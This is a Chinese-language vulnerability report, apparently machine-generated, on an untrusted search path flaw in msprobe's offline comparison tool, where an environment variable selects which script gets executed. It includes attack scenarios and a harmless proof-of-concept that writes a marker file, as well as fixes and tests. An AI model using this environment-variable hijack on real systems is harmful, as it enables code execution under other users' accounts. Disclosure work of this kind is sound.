# 漏洞报告: core_compare-004

## 漏洞概述

**漏洞ID**: core_compare-004  
**CWE分类**: CWE-426 (Untrusted Search Path)  
**严重程度**: 高 (High)  
**置信度**: 90%  
**影响版本**: 当前版本  

**漏洞位置**:
- 文件: `python/msprobe/core/compare/offline_data_compare.py`
- 行号: 24-67 (CANN_PATH定义) + 81 (使用点)
- 函数: `_check_msaccucmp_file()` 和 `call_msaccucmp()`

**漏洞描述**:
环境变量 `ASCEND_TOOLKIT_HOME` 的值被直接用于构造可执行脚本路径，未经过任何验证或清理。攻击者可以通过控制该环境变量，使其指向包含恶意 `msaccucmp.py` 脚本的目录，当用户执行 `msprobe compare -m offline_data` 命令时，恶意脚本将被执行。

---

## 攻击场景分析

### 完整攻击路径

```
[攻击者设置环境变量] 
    ↓
export ASCEND_TOOLKIT_HOME=/tmp/malicious_cann
    ↓
[攻击者创建恶意脚本]
/tmp/malicious_cann/
    └── toolkit/
        └── tools/
            └── operator_cmp/
                └── compare/
                    └── msaccucmp.py  (包含恶意代码)
    ↓
[受害者执行msprobe命令]
msprobe compare -m offline_data -m /path/to/data -g /path/to/golden
    ↓
[恶意代码执行]
msprobe → compare_cli() → compare_offline_data_mode() 
       → call_msaccucmp() → _check_msaccucmp_file(CANN_PATH)
       → subprocess.Popen(["python", "/tmp/malicious_cann/.../msaccucmp.py", ...])
```

### 攻击前置条件

1. **环境访问**: 攻击者需要对目标系统有本地访问权限，或能够修改用户的环境变量
2. **文件写入权限**: 攻击者需要在文件系统中创建恶意脚本的能力（如 `/tmp` 目录）
3. **用户行为**: 用户需要执行 `msprobe compare -m offline_data` 命令

### 攻击场景示例

#### 场景1: 共享服务器环境
```
在多用户共享服务器上:
1. 攻击者登录系统
2. 修改 /etc/profile.d/ 下的脚本或用户的 ~/.bashrc
   export ASCEND_TOOLKIT_HOME=/home/attacker/fake_cann
3. 创建恶意 msaccucmp.py 脚本
4. 等待其他用户执行 msprobe compare 命令
5. 恶意代码以执行用户的权限运行
```

#### 场景2: 容器环境
```
在容器化部署中:
1. 攻击者通过其他漏洞进入容器
2. 设置环境变量并创建恶意脚本
3. 当容器内的CI/CD流程调用 msprobe 时
4. 恶意代码在CI/CD环境中执行，可能窃取密钥或数据
```

#### 场景3: 恶意安装脚本
```
攻击者创建一个"工具安装脚本"，在后台设置恶意环境变量和脚本
当用户运行此脚本后，后续所有 msprobe 调用都会执行恶意代码
```

---

## PoC 构造思路

### 基础 PoC 步骤

1. **创建恶意CANN路径结构**:
```bash
MALICIOUS_CANN="/tmp/msprobe_poc"
mkdir -p "$MALICIOUS_CANN/toolkit/tools/operator_cmp/compare"
```

2. **创建恶意脚本 msaccucmp.py**:
```python
#!/usr/bin/env python3
import sys
import os
import datetime

# 恶意代码 - 仅演示，实际可执行任意操作
VULN_FLAG = "/tmp/pwned_by_core_compare_004"
with open(VULN_FLAG, "w") as f:
    f.write(f"Executed at: {datetime.datetime.now()}\n")
    f.write(f"Current user: {os.getenv('USER')}\n")
    f.write(f"Effective UID: {os.geteuid()}\n")

print(f"[+] Vulnerability confirmed!")
sys.exit(0)
```

3. **设置恶意环境变量**:
```bash
export ASCEND_TOOLKIT_HOME="$MALICIOUS_CANN"
```

4. **触发漏洞**:
```bash
msprobe compare -m offline_data -m /dev/null -g /dev/null
```

5. **验证漏洞**:
```bash
if [ -f "/tmp/pwned_by_core_compare_004" ]; then
    echo "[+] VULNERABILITY CONFIRMED!"
    cat /tmp/pwned_by_core_compare_004
fi
```

### 恶意脚本功能扩展

攻击者可以在恶意 msaccucmp.py 中实现:
- **数据窃取**: 窃取SSH密钥、API令牌、配置文件
- **持久化后门**: 安装cron任务、systemd服务
- **加密货币挖矿**: 在后台运行矿机
- **勒索软件**: 加密用户文件
- **横向移动**: 利用当前用户权限攻击其他系统

---

## 影响范围

### 直接影响

1. **任意代码执行**: 攻击者可以以当前用户的权限执行任意Python代码
2. **权限提升**: 如果 msprobe 被配置为 sudo 执行（罕见但可能），可获得 root 权限
3. **数据泄露**: 可窃取 SSH 密钥、API 令牌、敏感配置文件
4. **持久化**: 可安装后门、cron jobs、systemd services
5. **横向移动**: 在共享环境中影响其他用户

### 影响用户群体

1. **Ascend NPU 用户**: 使用华为昇腾芯片进行模型训练/推理的开发者
2. **AI/ML 工程师**: 在昇腾平台上进行精度调试和对比的人员
3. **企业用户**: 使用 MindStudio 进行 AI 开发的组织
4. **CI/CD 流水线**: 自动化测试中集成 msprobe 的环境

### 影响场景矩阵

| 场景 | 攻击复杂度 | 影响程度 | 可能性 |
|------|-----------|---------|-------|
| 共享服务器 | 低 | 高 | 高 |
| 容器环境 | 中 | 高 | 中 |
| 本地开发机 | 低 | 中 | 低 |
| CI/CD 流水线 | 中 | 极高 | 中 |
| 云端 Jupyter | 中 | 高 | 中 |

---

## 技术细节分析

### 漏洞代码分析

**问题代码 (第24行)**:
```python
CANN_PATH = os.environ.get("ASCEND_TOOLKIT_HOME", "/usr/local/Ascend/ascend-toolkit/latest")
```

**问题点**:
1. 直接从环境变量读取，无验证
2. 无路径规范化 (缺少 `os.path.realpath()`)
3. 无白名单检查
4. 无权限验证

**危险使用 (第81行)**:
```python
msaccucmp_script_path = _check_msaccucmp_file(CANN_PATH)
full_cmd = [python_cmd, msaccucmp_script_path, "compare"] + cmd_args
process = subprocess.Popen(full_cmd, shell=False, ...)
```

**执行流程**:
```python
_check_msaccucmp_file(CANN_PATH)
    ↓
for dir_path_option in MSACCUCMP_DIR_PATH_OPTIONS:
    full_path = os.path.join(cann_path, dir_path_option)
    script_path = os.path.join(full_path, "msaccucmp.py")
    if os.path.exists(script_path):
        return script_path  # 返回恶意路径!
```

### 与其他代码的对比

**安全实践示例 (从 file_utils.py)**:
```python
# 正确做法 - 使用 realpath 和验证
self.file_path = os.path.realpath(os.path.expanduser(self.file_path))
```

**本项目其他地方的安全处理**:
- `torchair_acc_cmp.py`: 使用 `_validate_read_path()` 验证路径
- `file_utils.py`: 使用 `os.path.realpath()` 规范化路径
- 但 `offline_data_compare.py` 完全缺乏这些保护

### 为什么这是真实漏洞

1. **输入源不可信**: 环境变量可被任何进程修改
2. **路径未验证**: 没有检查路径是否指向预期位置
3. **执行点危险**: `subprocess.Popen()` 执行不受控的脚本
4. **实际利用简单**: 只需设置环境变量和创建文件
5. **无缓解措施**: 代码中没有任何防御代码

---

## 修复建议

### 方案1: 路径白名单验证 (推荐)

```python
import os
import sys

# 定义可信路径白名单
TRUSTED_CANN_PATHS = [
    "/usr/local/Ascend/ascend-toolkit/latest",
    "/usr/local/Ascend/ascend-toolkit",
    "/opt/Ascend/ascend-toolkit/latest",
    "/opt/Ascend/ascend-toolkit",
]

def get_cann_path():
    """安全获取 CANN 路径"""
    cann_path = os.environ.get("ASCEND_TOOLKIT_HOME", "/usr/local/Ascend/ascend-toolkit/latest")
    
    # 规范化路径
    cann_path = os.path.realpath(cann_path)
    
    # 验证路径是否在白名单中
    for trusted_path in TRUSTED_CANN_PATHS:
        if cann_path.startswith(os.path.realpath(trusted_path)):
            return cann_path
    
    # 如果不在白名单中，记录警告并使用默认路径
    logger.warning(f"ASCEND_TOOLKIT_HOME is not in trusted paths. Using default.")
    return "/usr/local/Ascend/ascend-toolkit/latest"

CANN_PATH = get_cann_path()
```

### 方案2: 脚本哈希验证

```python
import hashlib

# 预期的 msaccucmp.py 脚本哈希值
EXPECTED_HASHES = {
    "sha256": "abc123...",  # 实际部署时填入
}

def _check_msaccucmp_file(cann_path):
    for dir_path_option in MSACCUCMP_DIR_PATH_OPTIONS:
        full_path = os.path.join(cann_path, dir_path_option)
        script_path = os.path.join(full_path, MSACCUCMP_SCRIPT)
        
        if os.path.exists(script_path):
            # 验证脚本完整性
            with open(script_path, 'rb') as f:
                script_hash = hashlib.sha256(f.read()).hexdigest()
            
            if script_hash in EXPECTED_HASHES.values():
                return script_path
            else:
                logger.error(f"msaccucmp.py hash mismatch. Possible tampering detected!")
                raise CompareException(CompareException.SECURITY_ERROR)
    
    error_msg = f"msaccucmp.py file not found. Please check the path: {CANN_PATH}"
    logger.error(error_msg)
    raise CompareException(CompareException.INVALID_PATH_ERROR)
```

### 方案3: 相对路径解析 (最安全)

```python
import os

def _get_msaccucmp_path():
    """从已安装的 msprobe 包位置推断 msaccucmp.py 位置"""
    msprobe_path = os.path.dirname(os.path.abspath(__file__))
    
    # 向上查找到 Ascend 安装根目录
    current = msprobe_path
    while current != '/':
        possible_path = os.path.join(current, 'toolkit/tools/operator_cmp/compare/msaccucmp.py')
        if os.path.exists(possible_path):
            return possible_path
        current = os.path.dirname(current)
    
    # 如果找不到，使用默认路径
    default_path = "/usr/local/Ascend/ascend-toolkit/latest"
    if os.path.exists(default_path):
        return _check_msaccucmp_file(default_path)
    
    raise CompareException(CompareException.INVALID_PATH_ERROR)
```

### 综合修复建议

**短期修复 (立即实施)**:
1. 实施方案1的路径白名单验证
2. 添加安全日志，记录所有环境变量使用情况
3. 在文档中警告用户不要修改 `ASCEND_TOOLKIT_HOME`

**中期修复 (1-2周)**:
1. 实施方案2的哈希验证
2. 添加单元测试验证安全机制
3. 发布安全公告

**长期修复 (1-2月)**:
1. 实施方案3的更安全方案
2. 考虑移除环境变量依赖，使用配置文件
3. 实施代码签名机制

---

## 验证测试

### 安全测试用例

```python
import os
import tempfile
import pytest
from msprobe.core.compare.offline_data_compare import _check_msaccucmp_file, CompareException

class TestCANNPathSecurity:
    
    def test_malicious_cann_path_rejected(self):
        """测试恶意路径应被拒绝"""
        with tempfile.TemporaryDirectory() as tmpdir:
            # 创建恶意路径
            malicious_path = os.path.join(tmpdir, 'fake_cann')
            os.makedirs(os.path.join(malicious_path, 'toolkit/tools/operator_cmp/compare'))
            
            # 创建恶意脚本
            script = os.path.join(malicious_path, 'toolkit/tools/operator_cmp/compare/msaccucmp.py')
            with open(script, 'w') as f:
                f.write('#!/usr/bin/env python3\nprint("MALICIOUS")')
            
            # 应该抛出异常或使用默认路径
            with pytest.raises(CompareException):
                _check_msaccucmp_file(malicious_path)
    
    def test_path_traversal_attack(self):
        """测试路径遍历攻击"""
        malicious_paths = [
            "/tmp/..",
            "/tmp/../..",
            "/dev/null/..",
        ]
        
        for path in malicious_paths:
            with pytest.raises(CompareException):
                _check_msaccucmp_file(path)
```

---

## 参考资料

- [CWE-426: Untrusted Search Path](https://cwe.mitre.org/data/definitions/426.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Python subprocess security best practices](https://docs.python.org/3/library/subprocess.html#security-considerations)

---

## 时间线

- **2026-04-20**: 漏洞发现并确认
- **待定**: 厂商通知
- **待定**: 补丁发布
- **待定**: 公开披露

---

**报告生成**: 自动化安全扫描系统  
**最后更新**: 2026-04-20
